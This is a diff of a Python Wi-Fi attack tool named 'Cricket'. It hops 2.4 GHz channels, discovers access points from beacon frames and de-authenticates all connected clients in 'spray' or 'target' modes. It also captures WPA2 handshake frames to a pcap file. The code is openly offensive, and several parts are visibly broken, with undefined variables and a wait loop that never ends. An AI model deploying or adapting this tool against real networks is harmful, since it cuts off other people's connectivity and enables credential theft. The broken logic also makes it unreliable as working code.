@@ -1,158 +1,131 @@
 #!/bin/python3
-from scapy.sendrecv import sniff
-from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap
-from scapy.utils import PcapWriter
-
-from time import sleep, monotonic
-
 import threading
-
-from subprocess import Popen
-
 import logging
-logger = logging.getLogger(__name__)
+import sys
+import argparse
+import WiFiJammer
 
-from AP import AccessPoint
+def parseArguments():
+	parser = argparse.ArgumentParser(description='A program that hops 2.4GHz channels to detect beacon frames and de-authorises all wirelessly connected hosts on the AP; Authentication frames may also be captured and saved to a .pcap file specified')
+	ignoring = parser.add_mutually_exclusive_group()
+	verbosity = parser.add_mutually_exclusive_group()
+	attacks = parser.add_mutually_exclusive_group()
 
-class Cricket():
-	def __init__(self, ignoreBeacons, attackMode, sendint, recvint, output, searchingChannels, targets, sleepOnChannel):
-		self.ignoreBeacons = ignoreBeacons
-		self.attackMode = attackMode
-		self.sendint = sendint
-		self.recvint = recvint
-		self.output = output
-		self.searchingChannels = searchingChannels
-		self.targets = targets
-		self.sleepOnChannel = sleepOnChannel
+	parser.add_argument('int1', action='store', help='Sets the interface to use for sending and/or receiving')
+	parser.add_argument('int2', nargs='?', action='store', help='Sets a secondary interface to use; int1 sends, int2 receives', default=None)
 
-		self.handshakesFound = {}
-		self.discoveredAPs = []
-		self.channelIndex = 0
-		self.running = True
+	ignoring.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (by ESSID or BSSID, separated by spaces)')
+	ignoring.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (by ESSID or BSSID, separated by newlines)')
 
-	def setRecvIntMonitor(self):
-		Popen(['ip', 'link', 'set', self.recvint, 'down'], shell=False)
-		Popen(['iw', 'dev', self.recvint, 'set', 'type', 'monitor'], shell=False)
-		Popen(['ip', 'link', 'set', self.recvint, 'up'], shell=False)
-		logging.debug('Set ' + self.recvint + ' to Monitor Mode')
+	attacks.add_argument('-t', '--target', dest='target', action='store', type=list, help='Target one or more APs (by ESSID or BSSID)')
+	attacks.add_argument('-s', '--spray', dest='spray', action='store_const', const='spray', help='Target every discovered AP until a handshake is captured')
+	attacks.add_argument('-u', '--unarmed', dest='unarmed', action='store_const', const='unarmed', help='Do not send any de-auth frames')
+		
+	verbosity.add_argument('-vv', '--very-verbose', dest='verbosity', action='store_const', const=logging.DEBUG, help='Set program to log debug information')
+	verbosity.add_argument('-v', '--verbose', dest='verbosity', action='store_const', const=logging.INFO, help='Set program to log normal functioning')
 
-	def setRecvIntStation(self):
-		Popen(['ip', 'link', 'set', self.recvint, 'down'], shell=False)
-		Popen(['iw', 'dev', self.recvint, 'set', 'type', 'station'], shell=False)
-		Popen(['ip', 'link', 'set', self.recvint, 'up'], shell=False)
-		logging.debug('Set ' + self.recvint + ' to Station Mode')
+	parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
+	parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
+	parser.add_argument('-w', '--wait-on-channel', dest='sleepOnChannel', action='store', type=int, help='Time to stay on each channel for when hopping', default=2)
 
-	def freqToChannel(self, freq):
-		base = 2407			# 2.4Ghz
-		if freq // 1000 == 5: 
-			base = 5000		# 5Ghz
-		# 2.4 and 5Ghz channels increment by 5
-		return (freq - base)//5
+	return parser.parse_args()
 
+def makeJammerInstance(args):
+	# Set list of APs to ignore
+	ignoredAPs = []
 
-	def changeChannel(self, newChannel, interface):
-		command = ['iwconfig', interface, 'channel', str(newChannel)]
+	if args.list != None:
+		ignoredAPs += args.list
+		logging.debug('Running with Ignore AP list from command line = ' + str(ignore_AP))
+	elif args.file != None:
+		with open(args.file, 'r') as file:
+			ignoredAPs += file.readlines()
+			logging.debug('Running with Ignore AP list from file = ' + str(ignore_AP))
 
-		Popen(command, shell=False)
+	# Set attack mode
+	attackMode = ''
+	targets = []
 
-		logging.debug('Set channel to ' + str(newChannel) + ' on ' + interface)
+	if args.target:
+		attackMode = 'target'
+		targets = self.args.target
+	elif args.spray:
+		attackMode = 'spray'
+	elif args.unarmed:
+		attackMode = 'unarmed'
 
-	def channelHop(self):
-		while self.running == True:
-			# if the channel index is that of the last in the searchingChannels list, reset it to 0
-			if self.channelIndex == len(self.searchingChannels) - 1:
-				self.channelIndex = 0
-			# otherwise, increment by 1
-			else:
-				self.channelIndex += 1
-			# Then for self.sleepOnChannel seconds, change the change to this one every 0.25 seconds
-			while monotonic() < monotonic() + self.sleepOnChannel:
-				self.changeChannel(self.searchingChannels[self.channelIndex], self.recvint)
-				sleep(0.25)
+	# Set appropriate sending and receiving interfaces
+	int1 = args.int1
 
-	def readPacket(self, packet):
-		# If the packet is a frame...
-		if packet.haslayer(Dot11):
-				# If the packet is a management frame
-				if packet.type == 0:
-					essid = bytes.decode(packet[Dot11Elt].info)
-					bssid = packet.addr2
-					# If the packet is a beacon frame
-					if packet.subtype == 8:
-						# If it isn't to be ignored
-						if essid not in self.ignoreBeacons or bssid not in self.ignoreBeacons:
-							# add bssid to discoveredAPs
-							# create new AccessPoint class and append to targets
-							# ensure we don't sniff further beacons by adding to ignoreBeacons
-							channel = self.freqToChannel(packet[RadioTap].Channel)
-							self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
-							self.ignoreBeacons.append(bssid)
-							logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
-					# Elif the packet is an authentication frame
-					elif packet.subtype == 11:
-						# if a handshake hasn't been captured
-						if bssid not in list(self.handshakesFound.keys()):
-							# Note it's been captured and write to output file if one exists
-							self.handshakesFound[bssid] = packet
-							logging.info('New Authentication Frame Found: ESSID = ' + essid)
-				
+	if not args.int2:
+		int2 = args.int1
+	else:
+		int2 = args.int2
+
+	# Create Jammer instance to share
+	return WiFiJammer.Jammer(ignoredAPs, attackMode, int1, int2, args.output, args.channels, targets, args.sleepOnChannel)
+
+def statDump(jammer):
+	statistics = {}
+	wapsDiscovered = 0
+	handshakesFound = 0
+	for AccessPoint in jammer.discoveredAPs:
+		wapsDiscovered += 1
+		# if a dict entry exists, append to it's corresponding list, else create it
+		if statistics[AccessPoint.channel]:
+			statistics[AccessPoint.channel].append(AccessPoint)
+		else:
+			statistics[AccessPoint.channel] = [AccessPoint]
+		for channels in statistics:
+			for AccessPoint in statistics[channel]:
+				if AccessPoint.bssid in jammer.handshakesFound:
+					handshakesFound += 1
+					log_str = '<Handshake Found>\t\t'		
 				else:
-					logging.debug('Found non-auth, non-beacon management frame')
-		else:
-			logging.debug('Found non-management frame transmission')
+					log_str = '<Handshake Not Found>\t'
+				log_str += 'ESSID: ' + AccessPoint.essid + ' CH: ' + str(AccessPoint.essid)
+				print(log_str)
+	print('\tWireless Access Points Discovered:\t' + str(wapsDiscovered))
+	print('\tWPA2 Handshakes Captured:\t\t' + str(handshakesFound))
 
-	def sniffPackets(self):
-		while self.running == True:
-			sniff(count=10, prn=self.readPacket)
+class CricketThreads(threading.Thread):
+	def __init__(self, jammerInstance, *args, **kwargs):
+		super(CricketThreads, self).__init__(*args, **kwargs)
+		self.jammerInstance = jammerInstance
 
-	def sprayAttack(self):
-		# Spray attacks every located target until it gets a handshake
-		while self.running == True:
-			for AccessPoint in self.discoveredAPs:
-				if AccessPoint.bssid not in list(self.handshakesFound.keys()):
-					self.changeChannel(AccessPoint.channel, self.sendint)
-					AccessPoint.jam(self.sendint)
+	def run(self):
+		if self.name == 'attackThread':
+			self.jammerInstance.launchAttack()
 
-	def unarmedAttack(self):
-		while self.running == True:
-		# Do not send any deauth
-			sleep(1)
+		elif self.name == 'sniffThread':
+			self.jammerInstance.sniffPackets()
 
-	def targetAttack(self):
-		while self.running == True:
-		# Only deauth targets
-			for AccessPoint in self.discoveredAPs:
-				if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
-					self.changeChannel(AccessPoint.channel, self.sendint)
-					AccessPoint.jam(self.sendint)
+		elif self.name == 'channelHopThread':
+			self.jammerInstance.channelHop()
 
-	def returnAttack(self):
-		# All three attacks condensed into one single switch
-		if self.attackMode == 'spray':
-			return self.sprayAttack
-		elif self.attackMode == 'unarmed':
-			return self.unarmedAttack
-		elif self.attackMode == 'target':
-			return self.targetAttack
-		else:
-			logging.debug('No attack mode set')
-			return None
-	
-	def launch(self):
-		# self.returnAttack
-		# sniff, kwargs=prn=self.readPacket()
-		# self.channelHop
-		attackThread = threading.Thread(target=self.returnAttack())
-		sniffingThread = threading.Thread(target=self.sniffPackets)
-		channelHopThread = threading.Thread(target=self.channelHop)
-		attackThread.start()
-		sniffingThread.start()
-		channelHopThread.start()
+def main():
+	args = parseArguments()
+	logging.basicConfig(stream=sys.stdout, format='\t%(message)s',level=args.verbosity)
+	jammer = makeJammerInstance(args)
+	jammer.setRecvIntMonitor()
+
+	threads = [
+		CricketThreads(jammerInstance=jammer, name='attackThread'),
+		CricketThreads(jammerInstance=jammer, name='sniffThread'),
+		CricketThreads(jammerInstance=jammer, name='channelHopThread')
+	]
+
+	for t in threads:
+		t.start()
+	try:
 		while True:
-			if self.running == False:
-				attackThread.join()
-				sniffingThread.join()
-				channelHopThread.join()
+			None
+	except KeyboardInterrupt:
+		jammer.halt()
+		jammer.setRecvIntStation()
+		for t in threads:
+			t.join()
+		statDump(jammer)
 
-	def halt(self):
-		self.running = False
+if __name__ == '__main__':
+    main()
